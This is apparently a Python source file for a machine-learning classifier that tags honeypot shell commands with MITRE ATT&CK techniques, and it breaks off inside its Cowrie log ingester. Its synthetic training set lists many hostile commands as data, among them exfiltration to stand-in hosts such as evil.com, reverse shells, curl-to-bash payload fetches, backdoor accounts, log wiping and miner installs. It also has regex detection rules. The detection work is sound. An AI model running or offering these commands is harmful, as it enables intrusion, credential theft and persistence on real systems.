# ============================================================
# HYBRID TTP CLASSIFIER v3.2 — ALL 5 PATCHES APPLIED
# ============================================================
# Architecture : BiLSTM → MultiHeadAttention → GAP
# Loss         : Focal Loss gamma=2.0
# Features     : 19 SOC features (17 v2 + 2 from Doc4)    (v3.1)
# Tokenizer    : Shell-aware filters
# Label noise  : Leakage-free add_noise
# [1] Load fix : compile=False + manual recompile          (v3.2)
# [2] Split    : Grouped by base-command key (3-way)       (v3.2)
# [3] Metrics  : Micro/Macro F1 + per-class PR-AUC         (v3.2)
# [4] Thresholds: Tuned on calibration set, not test       (v3.2)
# [5] Eval     : Source-balanced (synthetic vs real)       (v3.2)
# Ingestion    : Cowrie JSON + Dionaea SQLite
# Versioning   : Timestamped model saves
# ============================================================

import os
import re
import json
import sys
import random
import pickle
import sqlite3
import warnings
import numpy as np
import pandas as pd
from datetime import datetime
from pathlib import Path

from sklearn.model_selection import train_test_split
from sklearn.preprocessing import MultiLabelBinarizer
from sklearn.metrics import classification_report, hamming_loss, f1_score

import tensorflow as tf
from tensorflow.keras import layers, models, callbacks, backend as K
from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.optimizers import Adam
from tensorflow.keras.metrics import BinaryAccuracy
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt

warnings.filterwarnings('ignore')

# Windows terminals may default to cp1252; ensure Unicode-safe logging output.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

random.seed(42)
np.random.seed(42)
tf.random.set_seed(42)

VERSION    = "v3"
MODEL_NAME = "hybrid_ttp_v3"

print("=" * 80)
print(f"HYBRID TTP CLASSIFIER  {VERSION}")
print("BiLSTM + MultiHeadAttention | Focal Loss | 19 SOC Features")
print("Per-Class Thresholds | Cowrie + Dionaea Ingestion | OOD Eval")
print("=" * 80)


# ============================================================
# SOC FEATURE EXTRACTION — 17 features (v2, fully normalised)
# ============================================================
def extract_soc_features(cmd: str) -> list:
    if not isinstance(cmd, str):
        cmd = str(cmd)
    c = cmd.lower()

    # ── Network ─────────────────────────────────────────────
    has_ip       = int(bool(re.search(r'\d{1,3}(?:\.\d{1,3}){3}', cmd)))
    has_url      = int(any(p in c for p in ["http://", "https://", "ftp://", "sftp://"]))
    has_net_tool = int(any(t in c for t in [
                     "wget", "curl", "nc ", "ncat", "scp ", "rsync",
                     "tftp", "socat", "dig ", "nslookup"]))
    has_port     = int(bool(re.search(r':\d{2,5}(\s|$|")', cmd)))

    # ── Privilege escalation ─────────────────────────────────
    has_elevation = int(any(t in c for t in ["sudo", "pkexec", "su ", "doas", "runas"]))
    has_suid      = int("chmod +s" in c or "chmod 4" in c)

    # ── Persistence ──────────────────────────────────────────
    has_cron        = int(any(t in c for t in ["crontab", "/etc/cron", "/var/spool/cron"]))
    has_persistence = int(any(t in c for t in [
                        ".bashrc", ".bash_profile", ".profile",
                        "rc.local", "/etc/init.d", "systemctl enable"]))
    has_tmp         = int("/tmp" in c or "/var/tmp" in c or "/dev/shm" in c)

    # ── Evasion ──────────────────────────────────────────────
    has_log_tamper = int(any(t in c for t in [
                       "history -c", "history -d", "/var/log",
                       "journalctl", "shred", "wipe", "srm"]))
    has_base64     = int("base64" in c or bool(re.search(r'[A-Za-z0-9+/]{40,}={0,2}', cmd)))
    has_hex        = int(bool(re.search(r'\\x[0-9a-fA-F]{2}', cmd)))
    has_dev_null   = int("/dev/null" in c)

    # ── Recon & exfil ────────────────────────────────────────
    has_recon  = int(any(t in c for t in [
                   "nmap", "masscan", "arp", "netstat", "ss ",
                   "lsof", "ps aux", "who ", "id ", "uname"]))
    has_exfil  = int(any(t in c for t in [
                   "tar ", "zip ", "gzip", "7z ", "xz ",
                   "bzip2", "dd if", "split "]))

    # ── Structural complexity ────────────────────────────────
    pipe_count = min(cmd.count('|') / 5.0, 1.0)
    arg_count  = min(len(cmd.split()) / 25.0, 1.0)

    # ── Execution indicators (from Doc4 — high signal) ──────
    # Chaining operators: attacker commands frequently chain
    # multiple steps; benign admin commands rarely use && / ;
    has_chaining     = int(any(op in cmd for op in ["&&", " ; ", " | "]))

    # chmod +x followed by ./ is a near-universal staged-payload
    # execution pattern — almost never appears in benign traffic
    has_payload_exec = int(
        "chmod +x" in c or cmd.strip().startswith("./")
    )

    return [
        has_ip, has_url, has_net_tool, has_port,
        has_elevation, has_suid,
        has_cron, has_persistence, has_tmp,
        has_log_tamper, has_base64, has_hex, has_dev_null,
        has_recon, has_exfil,
        pipe_count, arg_count,
        has_chaining, has_payload_exec,          # ← new (features 18 & 19)
    ]

NUM_FEATURES = 19   # updated from 17 → 19


# ============================================================
# SHELL-AWARE TOKENIZER  (v2 + Doc3)
# Keeps: - / : . _ = @ ~ + * # % ^ !
# Strips: quotes, brackets, angle brackets, semicolons, tabs
# ============================================================
def build_tokenizer(vocab_size: int) -> Tokenizer:
    return Tokenizer(
        num_words  = vocab_size,
        oov_token  = '<OOV>',
        filters    = '"\'&()[]{}|<>?,;\t\n',
        lower      = True,
        split      = ' ',
        char_level = False,
    )


# ============================================================
# FOCAL LOSS  (v2)
# ============================================================
def focal_loss(gamma: float = 2.0, alpha: float = 0.25):
    def loss_fn(y_true, y_pred):
        y_pred  = K.clip(y_pred, K.epsilon(), 1.0 - K.epsilon())
        bce     = -y_true * K.log(y_pred) - (1 - y_true) * K.log(1 - y_pred)
        p_t     = y_true * y_pred + (1 - y_true) * (1 - y_pred)
        alpha_t = y_true * alpha + (1 - y_true) * (1 - alpha)
        fl      = alpha_t * K.pow(1.0 - p_t, gamma) * bce
        return K.mean(fl)
    loss_fn.__name__ = f'focal_loss_g{gamma}_a{alpha}'
    return loss_fn


# ============================================================
# DATASET GENERATOR — leakage-free add_noise  (v2 + Doc3)
# ============================================================
class FinalDatasetGenerator:
    # Default focused label space for honeypot command/network behavior.
    # 25 classes total (including BENIGN).
    RELEVANT_25 = [
        'BENIGN',
        'T1003_OS_Credential_Dumping',
        'T1016_System_Network_Config_Discovery',
        'T1018_Remote_System_Discovery',
        'T1021_Remote_Services',
        'T1027_Obfuscated_Files_or_Information',
        'T1033_System_Owner_Discovery',
        'T1041_Exfiltration_Over_C2_Channel',
        'T1046_Network_Service_Scanning',
        'T1053_Scheduled_Task',
        'T1059_Command_and_Scripting_Interpreter',
        'T1068_Exploitation_for_Privilege_Escalation',
        'T1069_Permission_Groups_Discovery',
        'T1070_Indicator_Removal',
        'T1071_Application_Layer_Protocol',
        'T1078_Valid_Accounts',
        'T1082_System_Information_Discovery',
        'T1083_File_and_Directory_Discovery',
        'T1087_Account_Discovery',
        'T1098_Account_Manipulation',
        'T1105_Ingress_Tool_Transfer',
        'T1110_Brute_Force',
        'T1112_Modify_Registry',
        'T1136_Create_Account',
        'T1496_Resource_Hijacking',
    ]

    def __init__(self):
        self.techniques = {

            'BENIGN': [
                "ls -la /home/user", "pwd", "whoami", "echo hello world",
                "cat /etc/hostname", "df -h", "du -sh /var/log",
                "ps aux | grep nginx", "top -bn1", "uptime",
                "find /home -name '*.conf'", "grep -r 'error' /var/log/syslog",
                "systemctl status apache2", "journalctl -u ssh --since today",
                "apt-get update", "pip install requests",
                "python3 -c 'print(1+1)'", "mkdir -p /opt/myapp",
                "cp /etc/hosts /tmp/hosts.bak", "chmod 644 /etc/hosts",
                "ssh user@192.168.1.10 'ls'", "scp file.txt user@host:/tmp/",
                "tar -czf backup.tar.gz /home/user", "unzip archive.zip -d /opt/",
                "crontab -l", "env | grep PATH", "export LANG=en_US.UTF-8",
                "git clone https://github.com/user/repo.git",
                "curl -s https://api.github.com/repos/user/repo",
                "wget -q https://example.com/file.tar.gz",
                "netstat -tulpn", "ss -anp", "ip addr show",
                "ping -c 4 8.8.8.8", "traceroute google.com",
                "openssl rand -hex 16", "sha256sum /etc/passwd",
                "awk -F: '{print $1}' /etc/passwd | head -5",
                "sed -i 's/old/new/g' config.cfg",
                "cat /etc/hosts", "vim /etc/hosts",
                "systemctl restart nginx", "service apache2 status",
            ],

            'T1003_OS_Credential_Dumping': [
                "cat /etc/shadow", "cat /etc/passwd | grep -v nologin",
                "unshadow /etc/passwd /etc/shadow > crackme",
                "python3 -c \"import subprocess; subprocess.run(['cat','/etc/shadow'])\"",
                "mimikatz.exe 'sekurlsa::logonpasswords' exit",
                "procdump.exe -ma lsass.exe lsass.dmp",
                "strings /proc/*/mem | grep -i password",
                "grep -r 'password' /var/www/html --include='*.php'",
                "find / -name 'id_rsa' 2>/dev/null",
                "find / -name '*.pem' 2>/dev/null",
                "cat ~/.aws/credentials", "cat ~/.ssh/id_rsa",
                "secretsdump.py -just-dc-user Administrator domain/user:pass@DC",
            ],

            'T1005_Data_from_Local_System': [
                "find / -name '*.docx' -newer /tmp/.ref 2>/dev/null",
                "find /home -name '*.kdbx' 2>/dev/null",
                "find / -name 'wallet.dat' 2>/dev/null",
                "locate *.pdf | xargs cp -t /tmp/loot/",
                "grep -r 'SSN\\|credit card\\|cvv' /home --include='*.txt'",
                "find /root -name '*.key' -exec cp {} /tmp/ \\;",
                "cat /etc/openvpn/*.conf",
            ],

            'T1012_Query_Registry': [
                "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions",
                "reg export HKLM\\SAM sam.reg",
                "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services",
                "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ],

            'T1016_System_Network_Config_Discovery': [
                "ifconfig -a", "ip route show", "ip neigh show",
                "cat /etc/resolv.conf", "cat /etc/network/interfaces",
                "nmcli connection show", "ip link show", "route -n", "arp -a",
            ],

            'T1018_Remote_System_Discovery': [
                "nmap -sn 192.168.1.0/24",
                "nmap -sV -p 22,80,443 10.0.0.0/24",
                "arp-scan --localnet",
                "fping -a -g 192.168.1.0/24 2>/dev/null",
                "nbtscan 192.168.1.0/24",
                "for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done",
            ],

            'T1021_Remote_Services': [
                "ssh -i ~/.ssh/stolen_key root@10.0.0.5",
                "ssh -L 8080:internal:80 user@jump.host",
                "xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5",
                "smbclient //10.0.0.5/C$ -U Administrator",
                "psexec.py Administrator:password@10.0.0.5 cmd.exe",
                "wmiexec.py domain/admin:pass@10.0.0.5",
            ],

            'T1027_Obfuscated_Files_or_Information': [
                "echo 'aGVsbG8=' | base64 -d | bash",
                "python3 -c \"exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())\"",
                "echo -e '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68'",
                "cat /tmp/encoded | xxd -r -p | bash",
                "perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'",
                "$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))",
            ],

            'T1033_System_Owner_Discovery': [
                "whoami /all", "id", "id -u", "groups",
                "cat /etc/passwd | grep -v nologin | grep -v false",
                "getent passwd | awk -F: '$3 >= 1000'",
                "last -n 10", "w", "who",
            ],

            'T1036_Masquerading': [
                "cp /bin/bash /tmp/sshd", "cp /usr/bin/python3 /tmp/systemd",
                "mv malware.sh .legit.sh", "chmod +x /tmp/.hidden_payload",
                "ln -s /bin/bash /tmp/kworker",
                "install -m 755 payload /usr/local/bin/update-manager",
            ],

            'T1041_Exfiltration_Over_C2_Channel': [
                "curl -X POST http://evil.com/collect -d @/etc/shadow",
                "wget --post-file=/etc/passwd http://attacker.com/receive",
                "cat /etc/shadow | nc 10.0.0.99 4444",
                "curl -s http://c2.attacker.com/beacon",
                "python3 -c \"import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())\"",
            ],

            'T1046_Network_Service_Scanning': [
                "nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1",
                "masscan -p1-65535 10.0.0.0/24 --rate=1000",
                "nmap -A -T4 192.168.1.0/24",
                "nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded",
                "nmap --script=vuln 10.0.0.1",
            ],

            'T1047_Windows_Management_Instrumentation': [
                "wmic process call create 'cmd.exe /c whoami'",
                "wmic /node:10.0.0.5 /user:admin process call create 'cmd.exe'",
                "wmic os get caption,version", "wmic useraccount list full",
                "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe'",
            ],

            'T1048_Exfiltration_Over_Alternative_Protocol': [
                "dnscat2 --secret=mysecret attacker.com",
                "iodine -f -P password dns.attacker.com",
                "python3 dns_exfil.py --domain attacker.com --file /etc/shadow",
                "nping --icmp 8.8.8.8 --data-hex $(xxd -p /etc/passwd | tr -d '\\n')",
            ],

            'T1053_Scheduled_Task': [
                "crontab -e",
                "(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -",
                "echo '@reboot /tmp/backdoor.sh' | crontab -",
                "echo '*/5 * * * * curl http://c2.com/beacon' | crontab -",
                "at now + 1 minute <<< '/tmp/payload'",
                "systemctl enable --now malicious.service",
                "ln -s /tmp/backdoor.sh /etc/cron.d/system-update",
            ],

            'T1055_Process_Injection': [
                "gdb -p $(pgrep sshd) -batch -ex 'call system(\"/tmp/payload\")'",
                "python3 -c \"import ctypes; ctypes.CDLL(None).system('/tmp/shell')\"",
                "LD_PRELOAD=/tmp/evil.so /usr/bin/sudo whoami",
                "ptrace inject $(pgrep bash) /tmp/shellcode",
            ],

            'T1059_Command_and_Scripting_Interpreter': [
                "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
                "python3 -c 'import socket,subprocess,os;...'",
                "perl -e 'use Socket; ...'",
                "php -r '$sock=fsockopen(\"10.0.0.99\",4444); ...'",
                "powershell.exe -EncodedCommand JABzA...",
                "sh -c 'curl http://evil.com/shell.sh | bash'",
                "python3 -c \"import os; os.system('id')\"",
            ],

            'T1068_Exploitation_for_Privilege_Escalation': [
                "./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'",
                "./pwnkit", "./CVE-2021-4034",
                "gcc exploit.c -o exploit && ./exploit",
                "python3 exploit.py --target localhost",
            ],

            'T1069_Permission_Groups_Discovery': [
                "cat /etc/group", "getent group sudo",
                "groups $(whoami)", "id -Gn",
                "net localgroup administrators",
                "Get-LocalGroupMember -Group Administrators",
            ],

            'T1070_Indicator_Removal': [
                "history -c && history -w",
                "shred -u /var/log/auth.log",
                "echo '' > /var/log/syslog",
                "find /var/log -name '*.log' -exec truncate -s 0 {} \\;",
                "rm -rf /tmp/* /var/tmp/*",
                "unset HISTFILE; export HISTSIZE=0",
                "> ~/.bash_history && history -c",
            ],

            'T1071_Application_Layer_Protocol': [
                "curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in",
                "wget -q -O- --header='X-Auth: token123' http://evil.com/cmd",
                "nc -e /bin/bash attacker.com 80",
            ],

            'T1072_Software_Deployment_Tools': [
                "ansible -m shell -a 'curl http://evil.com | bash' all",
                "puppet apply -e 'exec { \"/tmp/malware\": }'",
                "salt '*' cmd.run 'curl http://evil.com | bash'",
            ],

            'T1074_Data_Staged': [
                "mkdir /tmp/.staging && cp -r /home/*/.ssh /tmp/.staging/",
                "find / -name '*.pem' -exec cp {} /tmp/loot \\;",
                "tar -czf /tmp/data.tar.gz /home/*/Documents",
                "rsync -av /etc/ /tmp/etc_backup/",
            ],

            'T1078_Valid_Accounts': [
                "su - admin", "sudo -u www-data bash",
                "ssh admin@localhost", "su -s /bin/bash www-data",
                "runuser -l postgres -c 'psql -c \"SELECT pg_read_file(\\'/etc/passwd\\')\"'",
            ],

            'T1082_System_Information_Discovery': [
                "uname -a", "cat /etc/os-release", "lscpu",
                "dmesg | head -20", "cat /proc/version",
                "hostnamectl", "dmidecode -t system", "lsb_release -a",
            ],

            'T1083_File_and_Directory_Discovery': [
                "find / -perm -4000 -type f 2>/dev/null",
                "find / -writable -type d 2>/dev/null",
                "ls -la /root /etc /var/www",
                "find / -name '*.conf' -readable 2>/dev/null | head -20",
                "find /home -name '.env' 2>/dev/null",
                "locate wp-config.php",
            ],

            'T1087_Account_Discovery': [
                "cat /etc/passwd | awk -F: '$3 >= 1000'",
                "getent passwd | grep -v nologin",
                "net user /domain", "wmic useraccount list",
                "ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'",
            ],

            'T1090_Proxy': [
                "ssh -D 1080 -f -N user@jump.host",
                "proxychains nmap -sV 10.0.0.1",
                "chisel client 10.0.0.99:8000 R:80:127.0.0.1:80",
                "socat TCP-LISTEN:8080,fork TCP:internal.target:80",
            ],

            'T1095_Non_Application_Layer_Protocol': [
                "ping -c 1 -p 4142434445 attacker.com",
                "hping3 --icmp --data 1000 10.0.0.99",
                "python3 icmp_tunnel.py --server attacker.com",
            ],

            'T1098_Account_Manipulation': [
                "usermod -aG sudo compromised_user",
                "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
                "useradd -m -s /bin/bash -G sudo newadmin",
                "passwd -d root",
                "echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
            ],

            'T1105_Ingress_Tool_Transfer': [
                "wget http://attacker.com/payload -O /tmp/payload",
                "curl -sL http://evil.com/shell.sh -o /tmp/shell.sh",
                "scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/",
                "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')\"",
                "tftp -i 10.0.0.99 GET payload.exe C:\\Windows\\Temp\\payload.exe",
                "certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe",
            ],

            'T1110_Brute_Force': [
                "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1",
                "medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh",
                "ncrack -p 22 --user root -P pass.lst 10.0.0.1",
                "for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done",
            ],

            'T1112_Modify_Registry': [
                "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d C:\\payload.exe",
                "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Defender",
                "New-ItemProperty -Path 'HKLM:\\...' -Name Persist -Value 'C:\\payload.exe'",
            ],

            'T1113_Screen_Capture': [
                "import -window root /tmp/screenshot.png",
                "scrot -u /tmp/cap.png", "gnome-screenshot -f /tmp/grab.png",
                "python3 -c \"from PIL import ImageGrab; ImageGrab.grab().save('/tmp/s.png')\"",
            ],

            'T1119_Automated_Collection': [
                "find / -name '*.docx' -exec cp {} /tmp/collected/ \\;",
                "grep -rn 'password\\|secret\\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt",
                "python3 auto_collector.py --dirs /home,/etc --ext pdf,docx,kdbx",
            ],

            'T1123_Audio_Capture': [
                "arecord -d 60 -f cd /tmp/audio.wav",
                "sox -t alsa default /tmp/recording.wav trim 0 120",
                "ffmpeg -f alsa -i default -t 60 /tmp/mic.mp3",
            ],

            'T1132_Data_Encoding': [
                "cat /etc/shadow | base64 > /tmp/encoded.b64",
                "python3 -c \"import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())\"",
                "xxd /etc/shadow | tr -d '\\n' > /tmp/hex_dump.txt",
                "openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/enc_shadow",
            ],

            'T1136_Create_Account': [
                "useradd -m -s /bin/bash hacker",
                "adduser --shell /bin/bash --disabled-password backdoor",
                "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost",
                "net user /add attacker P@ssw0rd",
            ],

            'T1140_Deobfuscate_Decode': [
                "echo 'aGVsbG8gd29ybGQ=' | base64 -d",
                "cat /tmp/encoded | xxd -r -p",
                "python3 -c \"import base64; exec(base64.b64decode('aW1wb3J0IG9z'))\"",
                "openssl enc -aes-256-cbc -d -in /tmp/enc_payload -out /tmp/payload",
            ],

            'T1176_Browser_Extensions': [
                "cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/",
                "find ~/.mozilla -name '*.xpi' -exec cp {} /tmp/ \\;",
                "python3 decrypt_chrome_cookies.py --profile ~/.config/google-chrome/Default",
            ],

            'T1190_Exploit_Public_Facing_Application': [
                "sqlmap -u 'http://target.com/login?id=1' --dbs --batch",
                "python3 exploit_rce.py --target http://10.0.0.1:8080/api",
                "nuclei -u http://target.com -t cves/ -severity critical,high",
                "curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}'",
            ],

            'T1197_BITS_Jobs': [
                "bitsadmin /transfer myJob http://attacker.com/payload.exe %TEMP%\\payload.exe",
                "Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP",
            ],

            'T1201_Password_Policy_Discovery': [
                "cat /etc/pam.d/common-password",
                "chage -l root", "getent shadow | awk -F: '{print $1,$2}'",
                "net accounts /domain", "Get-ADDefaultDomainPasswordPolicy",
            ],

            'T1202_Indirect_Command_Execution': [
                "xargs -a /tmp/cmds.txt sh -c",
                "find /tmp -name 'cmd_*' -exec bash {} \\;",
                "python3 -c \"import subprocess; [subprocess.run(l.strip(),shell=True) for l in open('/tmp/cmds')]\"",
            ],

            'T1210_Exploitation_Remote_Services': [
                "python3 eternalblue.py 10.0.0.5",
                "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run'",
            ],

            'T1218_System_Binary_Proxy_Execution': [
                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";...",
                "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
                "msiexec /quiet /i http://evil.com/payload.msi",
                "bash -c 'python3 -c import os;os.system(\"id\")'",
            ],

            'T1219_Remote_Access_Software': [
                "nohup ./ngrok tcp 22 &", "ngrok http 80 --log=stdout",
                "./frpc -c frpc.ini", "chisel server --port 8080 --reverse",
            ],

            'T1497_Virtualization_Sandbox_Evasion': [
                "cat /proc/cpuinfo | grep hypervisor",
                "systemd-detect-virt",
                "dmesg | grep -i 'virtual\\|vmware\\|kvm\\|xen'",
            ],

            'T1496_Resource_Hijacking': [
                "curl -sL http://evil.com/xmrig | bash",
                "wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443",
                "nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &",
                "echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -",
            ],
        }

        # Label-space profile:
        #   LABEL_PROFILE=relevant25 (default)  -> focused 25 classes
        #   LABEL_PROFILE=relevant30            -> alias to relevant25
        #   LABEL_PROFILE=full                  -> all classes
        profile = os.getenv('LABEL_PROFILE', 'relevant25').strip().lower()
        if profile != 'full':
            keep = set(self.RELEVANT_25)
            self.techniques = {
                k: v for k, v in self.techniques.items()
                if k in keep
            }

    # ── Leakage-free add_noise ───────────────────────────────
    def add_noise(self, cmd: str, base_technique: str):
        if not isinstance(cmd, str):
            cmd = str(cmd)
        labels    = [base_technique]
        noisy_cmd = cmd
        is_attack = base_technique != 'BENIGN'

        # Chaining → T1059 only for attack commands
        if (is_attack and random.random() < 0.35
                and "&&" not in cmd and "|" not in cmd and ";" not in cmd):
            chain      = random.choice([" && ", " ; ", " | "])
            second_cmd = random.choice([
                "echo done", "sleep 1", "history -c",
                "chmod +x /tmp/payload", "> /dev/null 2>&1"])
            noisy_cmd = cmd + chain + second_cmd
            t59 = 'T1059_Command_and_Scripting_Interpreter'
            if t59 not in labels:
                labels.append(t59)

        # Base64 wrap → T1027 only for attack commands
        if is_attack and random.random() < 0.20:
            try:
                import base64 as _b64
                b64       = _b64.b64encode(noisy_cmd.encode()).decode()
                noisy_cmd = f"echo '{b64}' | base64 -d | bash"
                t27 = 'T1027_Obfuscated_Files_or_Information'
                if t27 not in labels:
                    labels.append(t27)
            except Exception:
                pass

        # Stylistic variation — no new labels
        if random.random() < 0.40:
            options = [
                noisy_cmd.replace(" ", "  "),
                f"nohup {noisy_cmd} &",
                f"bash -c \"{noisy_cmd}\"",
                f"time {noisy_cmd}",
            ]
            if is_attack:
                options.append(f"sudo {noisy_cmd}")
            noisy_cmd = random.choice(options)

        labels = list(dict.fromkeys(labels))
        return noisy_cmd, labels

    def generate_dataset(self, samples_per_technique=400, benign_multiplier=2.5):
        print(f"\n{'='*60}")
        print(f"GENERATING DATASET — {len(self.techniques)} CLASSES")
        print(f"{'='*60}")
        data = []
        for technique, commands in self.techniques.items():
            target = (int(samples_per_technique * benign_multiplier)
                      if technique == 'BENIGN' else samples_per_technique)
            for _ in range(target):
                base_cmd        = random.choice(commands)
                noisy_cmd, lbls = self.add_noise(base_cmd, technique)
                data.append({
                    'command':  noisy_cmd,
                    'features': extract_soc_features(noisy_cmd),
                    'label':    lbls,
                    'source':   'synthetic',
                })
            print(f"  ✅ {technique}: {target}")
        df = pd.DataFrame(data).sample(frac=1, random_state=42).reset_index(drop=True)
        print(f"\n✅ Total: {len(df):,}")
        return df


# ============================================================
# REAL LOG INGESTION — Cowrie + Dionaea  (v2, unchanged)
# ============================================================
class RealLogIngester:

    TRIAGE_RULES = [
        (r'file_download|download\s+via|url_fetch',                'T1105_Ingress_Tool_Transfer'),
        (r'ftp_login|auth_attempt|credential_attempt',             'T1078_Valid_Accounts'),
        (r'connection_event.*service=(ssh|telnet|rdp|smb|mysql)',  'T1021_Remote_Services'),
        (r'connection_event.*service=(http|https|ftp|smb|mysql)',  'T1046_Network_Service_Scanning'),
        (r'cat\s+/etc/shadow|unshadow|mimikatz|procdump|lsass', 'T1003_OS_Credential_Dumping'),
        (r'nmap|masscan|arp-scan|fping|nbtscan',                 'T1046_Network_Service_Scanning'),
        (r'base64\s+-d|echo.*\|\s*bash|xxd\s+-r|-EncodedCommand','T1027_Obfuscated_Files_or_Information'),
        (r'wget\s+http|curl\s+.*-[oO]\s+/tmp|tftp.*GET',        'T1105_Ingress_Tool_Transfer'),
        (r'hydra|medusa|ncrack|patator|rockyou',                 'T1110_Brute_Force'),
        (r'crontab|/etc/cron|@reboot',                           'T1053_Scheduled_Task'),
        (r'useradd|adduser|net\s+user\s+/add',                   'T1136_Create_Account'),
        (r'usermod.*sudo|echo.*sudoers|passwd\s+-d',             'T1098_Account_Manipulation'),
        (r'/dev/tcp|nc\s+-e\s+/bin|python.*subprocess.*socket', 'T1059_Command_and_Scripting_Interpreter'),
        (r'history\s+-c|shred.*log|echo.*>.*auth\.log',         'T1070_Indicator_Removal'),
        (r'curl.*POST.*\.|cat.*shadow.*nc\s+',                   'T1041_Exfiltration_Over_C2_Channel'),
        (r'xmrig|minexmr|cryptonight|stratum\+tcp',             'T1496_Resource_Hijacking'),
        (r'find\s+/.*-perm\s+-4000|dirtycow|pwnkit|CVE-',       'T1068_Exploitation_for_Privilege_Escalation'),
        (r'ssh\s+-[DRL]\s+|chisel|frpc|ngrok\s+tcp',            'T1090_Proxy'),
        (r'uname\s+-a|cat\s+/etc/os-release|systeminfo',        'T1082_System_Information_Discovery'),
        (r'cat\s+/etc/passwd|getent passwd|net\s+user\s+/domain','T1087_Account_Discovery'),
    ]
    PORT_SERVICE_MAP = {
        21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
        53: 'dns', 80: 'http', 110: 'pop3', 139: 'netbios',
        143: 'imap', 443: 'https', 445: 'smb', 1433: 'mssql',
        3306: 'mysql', 3389: 'rdp', 5432: 'postgres', 6379: 'redis',
    }

    def _triage(self, cmd: str) -> list:
        matches = [lbl for pat, lbl in self.TRIAGE_RULES
                   if re.search(pat, cmd, re.IGNORECASE)]
        return matches if matches else ['BENIGN']

    def _service_name(self, port):
        try:
            p = int(port)
        except Exception:
            return 'unknown'
        return self.PORT_SERVICE_MAP.get(p, 'unknown')

    def _canonicalize(self, cmd: str) -> str:
        if not isinstance(cmd, str):
            cmd = str(cmd)
        c = cmd.lower().strip()
        c = re.sub(r'https?://\S+|ftp://\S+|sftp://\S+', '<url>', c)
        c = re.sub(r'\b\d{1,3}(?:\.\d{1,3}){3}\b', '<ip>', c)
        c = re.sub(r'\b[a-f0-9]{32,64}\b', '<hash>', c)
        c = re.sub(r':\d{2,5}\b', ':<port>', c)
        c = re.sub(r'\b\d{2,5}\b', '<num>', c)
        c = re.sub(r'\s+', ' ', c).strip()
        return c

    def ingest_cowrie(self, log_path: str) -> pd.DataFrame:
        path = Path(log_path)
        if not path.exists():
            print(f"  ⚠️  Cowrie log not found: {log_path}")
            return pd.DataFrame()
        records = []
        with open(path, 'r', errors='replace') as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    entry = json.loads(line)
                except json.JSONDecodeError:
                    continue
                eventid = entry.get('eventid', '')

                # ── cowrie.command.input ──────────────────────
                # Standard terminal command typed by the attacker
                if eventid == 'cowrie.command.input':
                    cmd = self._canonicalize(entry.get('input', '').strip())

                # ── cowrie.session.file_download ──────────────
                # Attacker pulled a file over the session; reconstruct
                # a representative wget command so it flows through the
                # same feature extraction and triage pipeline.
                # This is the primary source of T1105 events in real logs.
                elif eventid == 'cowrie.session.file_download':
                    url = entry.get('url', '').strip()
                    if not url:
                        continue
                    cmd = self._canonicalize(f"file_download url_fetch {url} save payload")

                else:
                    continue

                if not cmd:
                    continue

                records.append({
                    'command':   cmd,
                    'features':  extract_soc_features(cmd),
                    'label':     self._triage(cmd),
                    'source':    'cowrie',
                    'timestamp': entry.get('timestamp', ''),
                    'src_ip':    entry.get('src_ip', ''),
                })
        df = pd.DataFrame(records)
